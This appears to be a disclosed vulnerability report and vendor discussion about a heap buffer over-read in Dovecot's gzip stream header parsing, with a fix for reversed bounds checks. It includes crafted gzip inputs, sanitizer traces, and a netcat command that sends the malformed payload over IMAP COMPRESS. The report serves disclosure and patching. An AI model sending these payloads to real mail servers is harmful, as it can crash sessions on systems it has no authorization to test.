title: Buffer over-reads in i_stream_zlib_read

profile.name: Open-Xchange
profile.about: Messaging, collaboration and office productivity software for service providers

vulnerability_information_html:
This can be reproduced by a sample program using libcompression

int main(int argc, char *argv[]) {
    const unsigned char *datadec;
    size_t sizedec;
    const uint8_t *data = argv[1];
    size_t size = strlen(data);
    struct istream *test_input = test_istream_create_data(data, size);
    const struct compression_handler *handler = compression_detect_handler(test_input);
    i_stream_seek(test_input, 0);
    if (handler != NULL && handler->create_istream != NULL) {
        struct istream *input = handler->create_istream(test_input, TRUE);
        i_stream_unref(&test_input);
        i_stream_read_more(input, &datadec, &sizedec);
        i_stream_unref(&input);
    }
    return 0;
}

with input being \x1f\x8b\x01Dovec/\x01\xbf

Stack trace is 

==40290==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x6020000001de at pc 0x00010a2dce25 bp 0x7ffee5964f70 sp 0x7ffee5964f68
READ of size 1 at 0x6020000001de thread T0
    #0 0x10a2dce24 in be16_to_cpu_unaligned byteorder.h:179
    #1 0x10a2dcdae in le16_to_cpu_unaligned byteorder.h:232
    #2 0x10a2dc80a in i_stream_zlib_read_header istream-zlib.c:107
    #3 0x10a2dac41 in i_stream_zlib_read istream-zlib.c:221
    #4 0x10a3061d3 in i_stream_read_memarea istream.c:313
    #5 0x10a305f1a in i_stream_read istream.c:271
    #6 0x10a309023 in i_stream_read_data istream.c:745
    #7 0x10a29bad0 in i_stream_read_more istream.h:224
    #8 0x10a29b9e9 in LLVMFuzzerTestOneInput fuzz-compression.c:29

Patch is fixing the comparaison direction :

diff --git a/src/lib-compression/istream-zlib.c b/src/lib-compression/istream-zlib.c
index 3e514cab84..c04df039d8 100644
--- a/src/lib-compression/istream-zlib.c
+++ b/src/lib-compression/istream-zlib.c
@@ -100,12 +100,12 @@ static int i_stream_zlib_read_header(struct istream_private *stream)
                return -1;
        }
        if ((data[3] & GZ_FLAG_FEXTRA) != 0) {
-               if (pos + 2 < size)
+               if (pos + 2 > size)
                        return 0;

                fextra_size = le16_to_cpu_unaligned(&data[pos]);
                pos += 2;
-               if (pos + fextra_size < size)
+               if (pos + fextra_size > size)
                        return 0;
                pos += fextra_size;
        }
@@ -122,7 +122,7 @@ static int i_stream_zlib_read_header(struct istream_private *stream)
                } while (data[pos++] != '\0');
        }
        if ((data[3] & GZ_FLAG_FHCRC) != 0) {
-               if (pos + 2 < size)
+               if (pos + 2 > size)
                        return 0;
                pos += 2;
        }

Impact

An attacker could cause a crash if the buffer over reads crosses a memory page boundary, or achieve to extract sensitive information

activities.message: Hi! To us it seems that this bug can at most flow over 4 bytes, and even then you can only crash your own session. Also this requires compression extension enabled, which is by default disabled. Do you agree with this assessment?

activities.message:
I agree, except maybe for the fact that it can flow at most over 4 bytes.

Without the patch about `fextra_size`, we can flow at most 0xFFFF bytes 

An example input is `\x1f\x8b\xff\xff\xff\xff\xffy\xff\xff\xff\xf5`

With this, we get stack trace
```
    #0 0x1044e1dad in i_stream_zlib_read_header istream-zlib.c:118
    #1 0x1044e0241 in i_stream_zlib_read istream-zlib.c:222
    #2 0x10450b793 in i_stream_read_memarea istream.c:313
    #3 0x10450b4da in i_stream_read istream.c:271
    #4 0x10450e5a3 in i_stream_read_data istream.c:745
    #5 0x1044a1129 in LLVMFuzzerTestOneInput fuzz-compression.c:29
```

With this input, we are ok with condition `if ((data[3] & GZ_FLAG_FEXTRA) != 0)` and skip error test `if (pos + 2 > size)` and are then ok with condition `(data[3] & GZ_FLAG_FNAME) != 0`

activities.message:
I did a naive test over IMAP protocol to see if this would yield any results, but at least so far no. 

```
(printf 'a LOGIN testuser pass\n'; sleep 0.1; printf 'a COMPRESS GZ\n\x1f\x8b\xff\xff\xff\xff\xffy\xff\xff\xff\xf5\0\0\0\0\0\0\0\0') | nc localhost 143
```

Leads into

```
Mar 26 20:04:38 imap(testuser)<29788><aPYB0cWhxs9/AAAB>: Info: Connection closed: zlib.read(<imap client>): missing gz header at 14 (COMPRESS finished 6.301 secs ago) in=14 out=458 deleted=0 expunged=0 trashed=0 hdr_count=0 hdr_bytes=0 body_count=0 body_bytes=0
```

I also tried with DEFLATE with similar results. Are you able to come up with some PoC that would allow this to be used over the wire?

To enable COMPRESS you need to add

```
mail_plugins = imap_zlib
```

To your config file

Yes, it was

I tried regular compilation with use of i_debug and I get the overflowing value with your input

 (printf 'a LOGIN testuser nopass\n'; sleep 0.1; printf 'c compress gz\n\x1f\x8b\xff\xff\xff\xff\xffy\xff\xff\xff\xf5\0\0\0\0\0\0\0\0\0')

Here is the code with my added i_debug and its output added as comment

    if ((data[3] & GZ_FLAG_FEXTRA) != 0) {
        if (pos + 2 > size)
            return 0;

        fextra_size = le16_to_cpu_unaligned(&data[pos]);
        pos += 2;
        if (pos + fextra_size < size)
            return 0;
        pos += fextra_size;
//Mar 27 16:29:36 imap(testuser)<28201><FiXYxNeh0NR/AAAB>: Debug: printf style string lol pos=62987 size=21 114
        i_debug("printf style string lol pos=%d size=%d %d", pos, size, __LINE__);
    }
    if ((data[3] & GZ_FLAG_FNAME) != 0) {
//Mar 27 16:29:36 imap(testuser)<28201><FiXYxNeh0NR/AAAB>: Debug: printf style string lol pos=62987 size=21 117
        i_debug("printf style string lol pos=%d %d %d", pos, size, __LINE__);
        do {
            if (pos == size)
                return 0;
        } while (data[pos++] != '\0');
//Mar 27 16:29:36 imap(testuser)<28201><FiXYxNeh0NR/AAAB>: Debug: printf style string lol pos=62988 size=21 122
        i_debug("printf style string lol pos=%d size=%d %d", pos, size, __LINE__);
    }

So, we get pos=62987 when size=21 and still read data[pos++]
The fact that it does not crash must come from the fact that there is another buffer used 62987 bytes later in memory... So we could leak some information

activities.message:
Looking at the code very carefully, you can see that each of those GZ_FLAG ones consume data that we do not care about. So they are not actually leaked. We might end up reading various random locations for the if, but in the end, we do `i_stream_skip(stream->parent, pos)` which places the stream squarely past EOF ensuring it will just sit there waiting for more data.

I do fully agree that this is a buffer overflow, but I cannot really see any possible way for this to leak information outside and the only practical use you can do is to crash your own session, turning this into a regular bug.

summaries.content: Due to missing checks in zlib-istream, the GZ algorithm can over-read input buffer when the stream extra information points to wrong memory area. This can lead into crash in imap component. The COMPRESS command is available only after login, making the impact limited.
